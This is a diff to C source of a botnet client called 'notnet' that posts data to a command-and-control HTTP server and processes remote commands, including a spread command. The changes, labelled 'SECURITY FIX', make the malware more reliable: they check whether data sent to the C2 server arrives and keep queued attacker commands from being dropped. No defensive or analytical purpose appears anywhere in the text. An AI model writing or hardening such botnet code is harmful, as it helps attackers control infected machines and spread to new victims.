@@ -396,9 +396,20 @@ int http_post(notnet_bot_t *bot, const char *data, int len) {
         "\r\n",
         bot->c2_http.path, bot->c2_http.server, bot->c2_http.user_agent, len);
     
-    send(bot->c2_http.sock, headers, strlen(headers), 0);
-    send(bot->c2_http.sock, data, len, 0);
-    
+    /* SECURITY FIX (#28): Check send() return values to detect connection
+     * drops. Previously sent headers+body without checking if they were
+     * actually transmitted. */
+    int sent = send(bot->c2_http.sock, headers, strlen(headers), 0);
+    if (sent < 0) {
+        log_warn("HTTP: failed to send headers: %s", strerror(errno));
+        return -1;
+    }
+    sent = send(bot->c2_http.sock, data, len, 0);
+    if (sent < 0 || sent < len) {
+        log_warn("HTTP: failed to send body (sent %d of %d): %s", sent, len, strerror(errno));
+        return -1;
+    }
+
     return 0;
 }
 
@@ -871,19 +882,19 @@ int protocol_process_commands(notnet_bot_t *bot) {
         bot->last_cmd_time = now;
         bot->cmd_this_second = 0;
     }
-    if (bot->cmd_this_second >= 10) {
-        log_warn("CMD: rate limit exceeded, dropping %d queued commands", bot->cmd_count);
-        bot->cmd_count = 0;
-        return 0;
-    }
+    /* SECURITY FIX (#27): Process up to 10 commands per second, skip excess.
+     * Previously: if rate limit hit, ALL commands dropped (cmd_count=0).
+     * Now: process up to 10, skip the rest, preserving unprocessed commands. */
+    int skipped = 0;
 
     for (int i = 0; i < bot->cmd_count; i++) {
         char *cmd = bot->cmd_queue[i];
-        bot->cmd_this_second++;
-        if (bot->cmd_this_second > 10) {
+        if (bot->cmd_this_second >= 10) {
             log_warn("CMD: rate limit exceeded, skipping command %d", i);
+            skipped++;
             continue;
         }
+        bot->cmd_this_second++;
         
         if (strncmp(cmd, CMD_SPREAD, strlen(CMD_SPREAD)) == 0) {
             char *args = cmd + strlen(CMD_SPREAD);
@@ -1070,6 +1081,10 @@ int protocol_process_commands(notnet_bot_t *bot) {
         }
     }
     
+    if (skipped > 0) {
+        log_warn("CMD: %d commands skipped due to rate limit", skipped);
+    }
+
     /* Clear processed commands */
     /* SECURITY FIX (#9): Only clear the queue when processing completed
      * normally. Connection failures during C2 ops should not silently
